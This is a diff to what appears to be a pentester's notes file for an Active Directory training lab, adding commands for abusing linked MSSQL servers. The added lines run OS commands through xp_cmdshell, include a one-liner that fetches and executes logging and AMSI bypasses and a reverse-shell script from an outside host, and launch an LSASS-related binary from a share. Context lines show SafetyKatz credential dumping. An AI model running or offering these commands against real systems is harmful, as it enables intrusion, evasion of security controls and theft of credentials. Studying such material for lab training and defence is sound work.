@@ -1206,6 +1206,56 @@ Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
 
 Then i will use a `impacket-mssqlclient` to provide connection
 
+To what other SQL servers connected server cat connect
+
+Version of OS and SQL Server
+
+```bash
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT @@version' -QueryTarget eu-sqlx
+```
+
+All databases in server 
+
+```bash
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT * FROM master.dbo.sysdatabases' -QueryTarget eu-sqlx
+```
+
+```bash
+select * from master..sysservers
+```
+
+The same as previous but from other link
+
+```bash
+select * from openquery("DCORP-SQL1",'select * from master..sysservers')
+```
+
+Execute commands in related to database link Windows host
+
+```bash
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
+```
+
+Automatic graph of trusts between SQL servers
+
+```bash
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
+```
+
+RCE via SQL server with AMSI bypass
+
+```bash
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sqlx
+```
+
+Run .exe file from SMB share
+
+```bash
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-studentx.dollarcorp.moneycorp.local\studentsharex\FindLSASSPID.exe''' -QueryTarget eu-sqlx
+```
+
+
+
 
 [[forwarding]]
 == Port-Forwarding and Sliver C2
@@ -1735,6 +1785,9 @@ SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
 safetykatz.exe "privilege::debug" "sekurlsa::evasive-logonpasswords" "exit" 
 ```
 
+```bash
+
+```
 
 
 [[ToSystem]]
